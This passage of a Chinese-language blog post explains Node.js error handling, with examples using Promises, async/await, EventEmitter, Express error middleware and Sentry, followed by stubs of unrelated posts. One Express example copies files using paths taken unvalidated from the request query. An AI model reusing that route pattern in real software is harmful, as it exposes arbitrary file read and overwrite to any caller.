<p>generator 提供了一种中断函数的执行而后再继续的能力，这种能力让它可以被用作异步流程控制：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> copyFileContent = co.<span class="title function_">wrap</span>(<span class="keyword">function</span>*(<span class="keyword">from</span>, to) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">yield</span> fs.<span class="title function_">writeFile</span>(to, <span class="keyword">yield</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="title function_">co</span>(<span class="keyword">function</span>*() &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">yield</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to));</span><br><span class="line">  &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>而 async&#x2F;await 则是基于 generator 的进一步优化，使代码更加简洁而且具有语义：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">copyFileContent</span>(<span class="params"><span class="keyword">from</span>, to</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">await</span> fs.<span class="title function_">writeFile</span>(to, <span class="keyword">await</span> fs.<span class="title function_">readFile</span>(<span class="keyword">from</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">await</span> <span class="title function_">copyFileContent</span>(<span class="keyword">from</span>, to));</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通常来说一个返回 Promise 的函数也有可能同步地抛出一个异常，这也是为什么前面的代码我用了一个 <code>Promise.try</code>，如果你的代码已经在一个 Promise 的 <code>.then</code> 里，那你就不必去加 <code>Promise.try</code> 了，甚至也不需要为每一个 Promise 添加 <code>.catch</code>，而是让它自动地向上层抛出，这和 Node.js style callback 有着本质的区别，下面我们来展示一个更复杂一些的例子：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Promise</span>.<span class="title function_">try</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(a, b);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(b, c);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">copyFileContent</span>(c, d);</span><br><span class="line">&#125;).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>这里我们将文件复制了三次，在主逻辑中我们依然没有去关心错误的情况，因为任何一个步骤发生了错误，都会到达最后的 catch 块中，这就是所谓的 Pormise chain, 但需要注意的是记得要在每个「返回 Promise 的函数」中添加 return, 否则调用者没有办法感知到你返回了一个 Promise.</p>
<p>语言内建的同步异常提供了调用栈，那么通过 Promise 传递的异步异常的调用栈会是什么样子的呢：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Error: EACCES: permission denied, open &#x27;to&#x27;</span><br><span class="line">    at Error (native)</span><br></pre></td></tr></table></figure>

<p>就像我们前面提到的那样，我们只能看到来自 JavaScript 引起的调用，而看不到这个异步任务的创建者。但实际上很多 Promise 的实现提供了一个「记录异步调用栈」的功能，当开启了这个选项之后：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Error: EACCES: permission denied, open &#x27;to&#x27;</span><br><span class="line">    at Error (native)</span><br><span class="line">From previous event:</span><br><span class="line">    at ~/test.js:15:15</span><br><span class="line">    at FSReqWrap.readFileAfterClose(fs.js:380:3)</span><br><span class="line">From previous event:</span><br><span class="line">    at copyFileContent (~/test.js:14:28)</span><br><span class="line">    at ~/test.js:20:10</span><br></pre></td></tr></table></figure>

<p>我们便可以看到创建这个异步任务的行号和更多的调用栈了，虽然这个选项对性能有一定影响，但我仍然建议开启这个选项，它将会很大程度上加快你定位线上错误的速度。</p>
<p>那么 Node.js style callback 是否有能力记录这样的异步调用栈呢？我的答案是不能，因为在 Node.js style callback 中，我们是直接在使用调用者传递进来的 callback, 中间没有任何的胶合代码允许我们插入记录调用栈的逻辑，除非手动在每一次调用时去添加调用栈，这样便会对业务代码产生侵入式的影响。而在 Promise 中，所有异步任务的回调都被包裹在一个 <code>.then</code> 中，异步调用都是间接地通过 Promise 完成的，这给了 Promise 实现记录异步调用栈的机会，而不会影响到业务代码。</p>
<p>当大家在争论 Promise 和 asycn&#x2F;await 谁才是未来的时候，可能忘记了 Node.js 还有个 events 模块，提供了基于事件的异步流程控制机制。如果说 Node.js style callback 和 Promise 都是一个操作对应一个结果的话，那么 EventEmitter 则提供了一个操作（甚至没有操作）对应多个结果的异步模型：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> redisClient = redis.<span class="title function_">createClient</span>();</span><br><span class="line"></span><br><span class="line">redisClient.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>EventEmitter 提供了一种基于事件的通知机制，每个事件的含义其实是由使用者自己定义的，但它对于 error 事件却有一些特殊处理：如果发生了 error 事件，但却没有任何一个监听器监听 error 事件，EventEmiter 就会把这个错误直接抛出 —— 通常会导致程序崩溃退出。</p>
<p>标准库里的很多组件和一些第三方库都会使用 EventEmitter, 尤其是例如数据库这类的长链接，我们要确保监听了它们的 error 事件 —— 哪怕是打印到日志中。其实这里也比较坑，因为当我们在使用第三方库的时候，除非文档上写了，否则我们可能并不知道它在哪里用到了 EventEmitter（有的库可能有多个地方都用到了）。</p>
<p>Node.js 中的 Stream 也是基于 EventEmitter 的：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="keyword">var</span> source = fs.<span class="title function_">createReadStream</span>(<span class="keyword">from</span>);</span><br><span class="line">  <span class="keyword">var</span> target = fs.<span class="title function_">createWriteStream</span>(to);</span><br><span class="line"></span><br><span class="line">  source.<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;).<span class="title function_">pipe</span>(target).<span class="title function_">on</span>(<span class="string">&#x27;error&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在上面的例子中，我创建了一个读文件的流和一个写文件的流，并将读文件的流 <code>.pipe</code> 到写文件的流，实现一个复制文件内容的功能。我们一开始看到 pipe 这个函数，可能会以为它会将前面的流的错误一起传递给后面的流，然后仅需在最后加一个 error 事件的处理器即可。但其实不然，我们需要去为每一个流去监听 error 事件。</p>
<p>如果有异常没有捕捉到怎么样？如果有一个异常一直被传递到最顶层调用栈还没有被捕捉，那么就会导致进程的崩溃退出，不过我们还有两个终极捕捉手段：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;uncaughtException&#x27;</span>, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(err);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">process.<span class="title function_">on</span>(<span class="string">&#x27;unhandledRejection&#x27;</span>, <span class="function">(<span class="params">reason, p</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">error</span>(reason, p);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>uncaughtException 事件可以捕捉到那些已经被抛出到最顶层调用栈的异常，一旦添加了这个监听器，这些异常便不再会导致进程退出。实际上有一些比较激进的人士认为程序一旦出现事先没有预料到的错误，就应该立刻崩溃，以免造成进一步的不可控状态，也为了提起开发人员足够的重视。但我从比较务实的角度建议还是不要这样做，尤其是服务器端程序，一个进程崩溃重启可能需要一分钟左右的时间，这段时间会造成服务的处理能力下降，也会造成一部分连接没有被正确地处理完成，这个后果很可能是更加严重的。</p>
<p>当我们应当将在这个事件中捕捉到的错误视作非常严重的错误，因为在此时已经丢失了和这个错误有关的全部上下文，必然无法妥善地处理这个错误，唯一能做的就是打印一条日志。</p>
<p>unhandledRejection 事件可以捕捉到那些被 reject 但没有被添加 <code>.catch</code> 回调的 Promise, 通常是因为你忘记为一个返回 Promise 的函数添加 return。因为 Promise 本来就是对异步错误的一种封装，所以实际使用中偶尔也会出现 Promise 先被 reject, 而后再用 <code>.catch</code> 添加错误处理的情况，所以这个事件实际上偶尔会有误报。</p>
<h2 id="传递异常"><a href="#传递异常" class="headerlink" title="传递异常"></a>传递异常</h2><p>前面我们按照 Node.js 中不同的异步流程控制方法介绍了如何捕捉和传递异常，接下来我还要介绍一些传递异常的过程中的一些最佳实践：</p>
<ul>
<li>注意 Promise &#x2F; callback chain 不要从中间断开</li>
<li><strong>只处理已知的、必须在这里处理的异常，其他异常继续向外抛出</strong></li>
<li>不要轻易地丢弃一个异常</li>
<li>传递的过程中可以向 err 对象上添加属性，补充上下文</li>
</ul>
<p>相信在调试过程中最让人恼火的事情就是明明有错误发生，但错误却没有正确地传递回来，通常是因为这个错误在代码中被「不小心」地处理掉了，因此我们应该在进行错误处理时去注意保障外层代码的「知情权」，仅去处理必须在此处处理的异常，应该严格地去判断异常的类型和 message，确保只处理预期的异常，而其他大部分的异常都要继续向外层抛出：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">writeLogs</span>(<span class="params">logs</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;out/logs&#x27;</span>, logs).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (err.<span class="property">code</span> === <span class="string">&#x27;ENOENT&#x27;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> fs.<span class="title function_">mkdir</span>(<span class="string">&#x27;out&#x27;</span>).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> fs.<span class="title function_">writeFile</span>(<span class="string">&#x27;out/logs&#x27;</span>, logs);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我们实现了向 <code>out/logs</code> 这个文件写入日志的函数，如果 out 这个目录不存在则会产生一个 <code>ENOENT</code> 的错误，我们非常确信这个错误应该通过创建 out 这个目录来解决，所以我们决定去捕捉 <code>fs.writeFile</code> 的错误，然后严格地去判断 <code>err.code</code>，如果不是 <code>ENOENT</code> 还要继续抛出。其实打印日志也算是处理异常的一种，如果没有必要在此处打印日志（例如你还会继续抛出这个错误），那么就不要轻易打印日志，否则就会出现我们前面提到的，程序中发生了一个错误，到处都在打印日志。</p>
<p>既然我们不应该轻易地处理异常，那么显然也不应该轻易地丢弃一个异常：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">copyFileContent</span>(<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>).<span class="title function_">catch</span>( <span class="function"><span class="params">err</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// ignored</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>的确有时我们需要忽略一个错误，但即使要忽略错误，也应该去判断异常的类型，确保它的确是我们想要忽略的那种错误。</p>
<p>前面我们提到了上下文对定位错误的重要性，有的时候我们可以捕捉异常，向上面附加一些上下文然后继续抛出：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mysqlQuery</span>(<span class="params">sql, placeholders</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> mysqlClient.<span class="title function_">exec</span>(sql, placeholders).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">    err.<span class="property">sql</span> = sql;</span><br><span class="line">    <span class="keyword">throw</span> err;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的例子是一个用来进行数据库查询的工具函数，当一个数据库查询失败了，我们最感兴趣的可能是这个查询是什么，因此在这里我们捕捉了查询失败时的异常，将 SQL 语句作为属性附加到异常上，然后继续抛出。</p>
<p>还有的时候我们捕捉异常是为了回滚数据：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">mysqlTransaction</span>(<span class="params">transaction</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> mysqlPool.<span class="title function_">getConnection</span>( <span class="function">(<span class="params">connection</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> connection.<span class="title function_">beginTransaction</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="title function_">transaction</span>(connection).<span class="title function_">then</span>( <span class="function">(<span class="params">result</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> connection.<span class="title function_">commit</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">return</span> result;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;).<span class="title function_">catch</span>( <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> connection.<span class="title function_">rollback</span>().<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">throw</span> err;</span><br><span class="line">        &#125;);</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的例子是一个用来进行数据库事务操作的工具函数，我们先从连接池得到一个连接、开始一个事务，然后执行要在事务中进行的操作。如果操作执行完成，我们提交这个事务，如果执行失败，我们捕捉异常，然后将事务回滚，最后将异常继续向外层抛出 —— 因为作为一个工具函数我们并不知道这个事务的失败对于业务逻辑意味着什么。</p>
<h2 id="在程序的边界处理异常"><a href="#在程序的边界处理异常" class="headerlink" title="在程序的边界处理异常"></a>在程序的边界处理异常</h2><p>前面我们讲了那么多都在提醒大家不要轻易地处理异常，而是让异常沿着调用栈向外层传递，在传递的过程中可能有一部分异常被忽略或以重试的方式被处理了，但还有一些「无法恢复」的异常被传递到了程序的「边界」，这些异常可能是预期的（无法成功执行的任务）或者非预期的（程序错误），所谓程序的边界可能是：</p>
<ul>
<li>Routers（对于 Web-backend 而言）</li>
<li>UI Layer（对于 Web&#x2F;Desktop App 而言）</li>
<li>Command Dispatcher（对于 CLI Tools 而言）</li>
</ul>
<p>我们需要在程序的边界来处理这些错误，例如：</p>
<ul>
<li>展示错误摘要</li>
<li>发送响应、断开 HTTP 连接（Web-backend）</li>
<li>退出程序（CLI Tools）</li>
<li>记录日志</li>
</ul>
<p><strong>正因为这些错误最后被汇总到了一处，我们可以以一种统一的、健壮的方式去处理这些错误</strong>，例如在一个 Express 程序中，我们会有这样的代码：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="title function_">copyFileContent</span>(req.<span class="property">query</span>.<span class="property">from</span>, req.<span class="property">query</span>.<span class="property">to</span>).<span class="title function_">then</span>( <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>();</span><br><span class="line">  &#125;).<span class="title function_">catch</span>(next);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(<span class="function">(<span class="params">err, req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">  err.<span class="property">userId</span> = req.<span class="property">user</span>.<span class="property">id</span>;</span><br><span class="line">  err.<span class="property">url</span> = req.<span class="property">originalUrl</span>;</span><br><span class="line">  logger.<span class="title function_">error</span>(err);</span><br><span class="line">  res.<span class="title function_">status</span>(err.<span class="property">statusCode</span> || <span class="number">500</span>).<span class="title function_">send</span>(err.<span class="property">message</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>Express 是没有对 Promise 提供支持的，因此 Express 的中间件可以算是 Promise 代码的边界，我们需要手动地将异常传递给 Express 的 next, 以便进入到 Express 的错误处理流程。</p>
<p>Express 提供了一种错误处理中间件，在这里我们依然保留着有关 HTTP 连接的上下文，一个比较好的实践是在这里将 HTTP 连接所关联的用户、请求的 URL 等信息作为上下文附加到错误对象上，然后将错误记录到日志系统中，最后向客户端发送一个错误摘要。</p>
<p>这里只是一个简单的例子，在实际项目中这个错误处理中间件可能会很长很复杂，有很多内部的约定（例如 <code>err.statusCode</code>）来决定如何处理这个错误，正是因为错误被汇总到了这里，我们才有能力进行统一的处理。</p>
<p>最后，我向大家推荐一个叫 <a target="_blank" rel="noopener" href="https://getsentry.com/">Sentry</a> 的开源软件，它提供了各个语言的 SDK, 仅需简单的配置就可以将错误发送到 Sentry 提供的一个 Web 服务上面（实际上我们的项目中就会在 Express 的错误处理中间件向 Sentry 发送错误）。Sentry 提供了一个 Web 的 Dashboard, 会将同类错误聚合在一起，显示每个错误在过去一段时间发生的次数、影响的用户数量。你还可以在向 Sentry 发送错误时提供额外的 Tag, Sentry 可以根据 Tag 进行统计和分析。Sentry 还可以通过添加规则的方式配置 Webhook 和邮件报警。</p>
<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>我们来对今天的技术分享做一个简单的小结：</p>
<ul>
<li>在层次化的架构中，很多时候在当前的层级没有足够的信息去决定如何处理错误，因此我们需要使用异常来将错误沿着调用栈逆向抛出，直到某个层级有足够的信息来处理这个错误。</li>
<li>在异步的场景下我们应该使用 Promise 或相兼容的流程控制工具来模拟异常机制。</li>
<li>传递异常时可以回滚数据或向其补充上下文，但如非必要，需要继续向外抛出。</li>
<li>让所有无法被恢复的错误传递到程序的「边界」处，统一处理。</li>
</ul>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/02/2016/awesome-minecraft-shader/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/10/02/2016/awesome-minecraft-shader/" itemprop="url">劳资也是开得起 Minecraft 光影的男人辣！</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-02T21:52:50+08:00">
                2016-10-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E6%97%A5%E5%B8%B8/" itemprop="url" rel="index">
                    <span itemprop="name">日常</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
          <p>这次国庆去电脑城摸了块 GTX750（原先的 9800GT 实在是烂得不行了）和一块新硬盘回来，克隆完硬盘后就迫不及待地给 MC 打上了 <code>GLSL Shader Mod</code>。玩了一会后我的表情是这样的：<img src="https://img.prin.studio/images/2017/06/10/c066215f622f0bf2fe7ee9625955e343.jpg" alt="表情1"></p>
<p>不得不说上了光影之后的 MC <strong>根本不是一个游戏啊</strong>！</p>
<p><img src="https://img.prin.studio/images/2017/06/10/95e7cf170b0d4f5fbe87e97360faacb9.png" alt="Screenshot1"></p>
          <!--noindex-->
          <div class="post-button text-center">
            <a class="btn" href="/2016/10/02/2016/awesome-minecraft-shader/#more" rel="contents">
              Read more &raquo;
            </a>
          </div>
          <!--/noindex-->
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2016/10/01/%E5%83%8F%E8%AF%97%E4%BA%BA%E4%B8%80%E6%A0%B7%E7%9D%BF%E6%99%BA%EF%BC%8C%E5%83%8F%E5%A4%A9%E6%89%8D%E4%B8%80%E6%A0%B7%E7%96%AF%E7%8B%82/" itemprop="url">像诗人一样睿智，像天才一样疯狂</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-10-01T17:12:43+08:00">
                2016-10-01
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index">
                    <span itemprop="name">读书笔记</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-4522670236044605"
     crossorigin="anonymous"></script>
<ins class="adsbygoogle"
     style="display:block; text-align:center;"
     data-ad-layout="in-article"
     data-ad-format="fluid"
     data-ad-client="ca-pub-4522670236044605"
     data-ad-slot="5167312561"></ins>
<script>
     (adsbygoogle = window.adsbygoogle || []).push({});
</script>
      
      

      
        
